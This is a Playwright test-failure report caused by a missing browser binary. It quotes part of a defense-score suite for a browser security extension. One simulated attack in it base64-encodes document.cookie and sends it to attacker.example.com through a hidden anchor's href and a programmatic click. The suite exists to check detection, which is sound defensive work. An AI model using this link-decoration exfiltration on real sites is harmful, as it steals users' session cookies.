# Instructions

- Following Playwright test failed.
- Explain why, be concise, respect Playwright best practices.
- Provide a snippet of code with the fix, if possible.

# Test info

- Name: defense-score.test.ts >> Defense Score (MAIN World Attacks) >> network/network-beacon: Tracking Beacon
- Location: src/defense-score.test.ts:4205:5

# Error details

```
Error: browserType.launchPersistentContext: Executable doesn't exist at /Users/hikae/Library/Caches/ms-playwright/chromium-1217/chrome-mac-arm64/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing
╔════════════════════════════════════════════════════════════╗
║ Looks like Playwright was just installed or updated.       ║
║ Please run the following command to download new browsers: ║
║                                                            ║
║     pnpm exec playwright install                           ║
║                                                            ║
║ <3 Playwright Team                                         ║
╚════════════════════════════════════════════════════════════╝
```

# Test source

```ts
  3845 |           return {
  3846 |             blocked: false,
  3847 |             executionTime: performance.now() - startTime,
  3848 |             details:
  3849 |               "BENIGN: new BroadcastChannel('app-login-sync') created and posted a login-state sync message — " +
  3850 |               "if the extension raised broadcast_channel here it is a false positive",
  3851 |           };
  3852 |         } catch (error: any) {
  3853 |           return {
  3854 |             blocked: false,
  3855 |             executionTime: performance.now() - startTime,
  3856 |             details: `BENIGN: BroadcastChannel threw (${error?.message}) — benign tab sync, not an attack`,
  3857 |           };
  3858 |         }
  3859 |       }),
  3860 |   },
  3861 | 
  3862 |   // --- Real Attack ---
  3863 |   {
  3864 |     id: "stealth-link-decoration-exfil",
  3865 |     name: "Stealth Link Decoration Exfiltration",
  3866 |     category: "network",
  3867 |     description:
  3868 |       "Exfiltrates data by modifying an anchor element's href to embed stolen data in URL parameters, " +
  3869 |       "then programmatically clicking the link. No hook monitors link.href modifications or programmatic " +
  3870 |       "anchor clicks for exfiltration.",
  3871 |     severity: "high",
  3872 |     simulate: (page) =>
  3873 |       page.evaluate(async () => {
  3874 |         const startTime = performance.now();
  3875 |         try {
  3876 |           const stolenData = btoa(
  3877 |             JSON.stringify({ session: document.cookie || "no-cookie", origin: location.origin, ts: Date.now() }),
  3878 |           );
  3879 |           const anchor = document.createElement("a");
  3880 |           // Embed stolen payload in query string — no hook watches href assignments
  3881 |           anchor.href = `https://attacker.example.com/track?d=${encodeURIComponent(stolenData)}`;
  3882 |           anchor.rel = "noopener noreferrer";
  3883 |           anchor.style.display = "none";
  3884 |           document.body.appendChild(anchor);
  3885 |           // Programmatic click — no hook monitors this for exfiltration
  3886 |           anchor.click();
  3887 |           document.body.removeChild(anchor);
  3888 |           return {
  3889 |             blocked: false,
  3890 |             executionTime: performance.now() - startTime,
  3891 |             details:
  3892 |               `Link decoration exfil executed — stolen payload (${stolenData.length} bytes base64) embedded in href ` +
  3893 |               "and programmatic anchor.click() triggered; no extension hook monitors href writes or anchor clicks",
  3894 |           };
  3895 |         } catch (error: any) {
  3896 |           const msg = error?.message ?? String(error);
  3897 |           return {
  3898 |             blocked: msg.includes("blocked") || msg.includes("ERR_BLOCKED"),
  3899 |             executionTime: performance.now() - startTime,
  3900 |             details: `Link decoration exfil failed: ${msg}`,
  3901 |           };
  3902 |         }
  3903 |       }),
  3904 |   },
  3905 | ];
  3906 | 
  3907 | // ============================================================================
  3908 | // Test Infrastructure
  3909 | // ============================================================================
  3910 | 
  3911 | interface TestContext {
  3912 |   context: BrowserContext;
  3913 |   page: Page;
  3914 |   server: Server;
  3915 |   serverPort: number;
  3916 | }
  3917 | 
  3918 | function startTestServer(): Promise<{ server: Server; port: number }> {
  3919 |   return new Promise((resolve) => {
  3920 |     const testPageContent = readFileSync(TEST_PAGE_PATH, "utf-8");
  3921 |     const server = createServer((req, res) => {
  3922 |       if (req.url === "/" || req.url === "/test-page.html") {
  3923 |         res.writeHead(200, { "Content-Type": "text/html" });
  3924 |         res.end(testPageContent);
  3925 |       } else {
  3926 |         res.writeHead(200, { "Content-Type": "application/json" });
  3927 |         res.end(JSON.stringify({ ok: true }));
  3928 |       }
  3929 |     });
  3930 |     server.listen(0, "127.0.0.1", () => {
  3931 |       const addr = server.address();
  3932 |       const port = typeof addr === "object" && addr ? addr.port : 3456;
  3933 |       resolve({ server, port });
  3934 |     });
  3935 |   });
  3936 | }
  3937 | 
  3938 | async function setupBrowser(): Promise<TestContext> {
  3939 |   if (!existsSync(AUDIT_EXTENSION_PATH)) {
  3940 |     throw new Error(`Audit extension not found at ${AUDIT_EXTENSION_PATH}. Run: pnpm --filter @pleno-audit/audit-extension build`);
  3941 |   }
  3942 | 
  3943 |   const { server, port } = await startTestServer();
  3944 | 
> 3945 |   const context = await chromium.launchPersistentContext("", {
       |                   ^ Error: browserType.launchPersistentContext: Executable doesn't exist at /Users/hikae/Library/Caches/ms-playwright/chromium-1217/chrome-mac-arm64/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing
  3946 |     headless: false,
  3947 |     args: [
  3948 |       "--headless=new",
  3949 |       `--disable-extensions-except=${AUDIT_EXTENSION_PATH}`,
  3950 |       `--load-extension=${AUDIT_EXTENSION_PATH}`,
  3951 |       "--no-first-run",
  3952 |       "--disable-default-apps",
  3953 |     ],
  3954 |   });
  3955 | 
  3956 |   // Wait for extension service worker to be ready
  3957 |   for (let attempt = 0; attempt < 15; attempt++) {
  3958 |     await new Promise((r) => setTimeout(r, 500));
  3959 |     const serviceWorkers = context.serviceWorkers();
  3960 |     if (serviceWorkers.some((sw) => sw.url().includes("background"))) break;
  3961 |   }
  3962 | 
  3963 |   const page = await context.newPage();
  3964 |   return { context, page, server, serverPort: port };
  3965 | }
  3966 | 
  3967 | // ============================================================================
  3968 | // Scoring
  3969 | // ============================================================================
  3970 | 
  3971 | interface TestResultEntry {
  3972 |   attack: AttackDef;
  3973 |   result: AttackResult;
  3974 | }
  3975 | 
  3976 | function calculateScore(results: TestResultEntry[]): {
  3977 |   totalScore: number;
  3978 |   maxScore: number;
  3979 |   grade: Grade;
  3980 |   categories: CategoryScore[];
  3981 | } {
  3982 |   const byCategory = new Map<AttackCategory, TestResultEntry[]>();
  3983 |   for (const r of results) {
  3984 |     const existing = byCategory.get(r.attack.category) ?? [];
  3985 |     existing.push(r);
  3986 |     byCategory.set(r.attack.category, existing);
  3987 |   }
  3988 | 
  3989 |   const categories: CategoryScore[] = [];
  3990 |   let weightedScore = 0;
  3991 |   let totalWeight = 0;
  3992 | 
  3993 |   for (const [category, entries] of byCategory) {
  3994 |     let score = 0;
  3995 |     let maxScore = 0;
  3996 |     let blocked = 0;
  3997 | 
  3998 |     for (const entry of entries) {
  3999 |       const testMax = SEVERITY_SCORES[entry.attack.severity];
  4000 |       maxScore += testMax;
  4001 |       if (entry.result.blocked) {
  4002 |         score += testMax;
  4003 |         blocked++;
  4004 |       }
  4005 |     }
  4006 | 
  4007 |     categories.push({ category, score, maxScore, blocked, total: entries.length });
  4008 | 
  4009 |     const weight = CATEGORY_WEIGHTS[category];
  4010 |     const normalized = maxScore > 0 ? (score / maxScore) * 100 : 0;
  4011 |     weightedScore += normalized * weight;
  4012 |     totalWeight += weight;
  4013 |   }
  4014 | 
  4015 |   const totalScore = totalWeight > 0 ? Math.round(weightedScore / totalWeight) : 0;
  4016 | 
  4017 |   return {
  4018 |     totalScore,
  4019 |     maxScore: 100,
  4020 |     grade: scoreToGrade(totalScore),
  4021 |     categories,
  4022 |   };
  4023 | }
  4024 | 
  4025 | // ============================================================================
  4026 | // Tests
  4027 | // ============================================================================
  4028 | 
  4029 | test.describe("Defense Score (MAIN World Attacks)", () => {
  4030 |   let ctx: TestContext;
  4031 |   const allResults: TestResultEntry[] = [];
  4032 | 
  4033 |   test.beforeAll(async () => {
  4034 |     ctx = await setupBrowser();
  4035 |     // Navigate to test page
  4036 |     await ctx.page.goto(`http://127.0.0.1:${ctx.serverPort}/test-page.html`, {
  4037 |       waitUntil: "domcontentloaded",
  4038 |     });
  4039 |     // Wait for extension content scripts to inject
  4040 |     await ctx.page.waitForTimeout(2000);
  4041 | 
  4042 |     // Extension hooks are now active on the test page
  4043 |   });
  4044 | 
  4045 |   test.afterAll(async () => {
```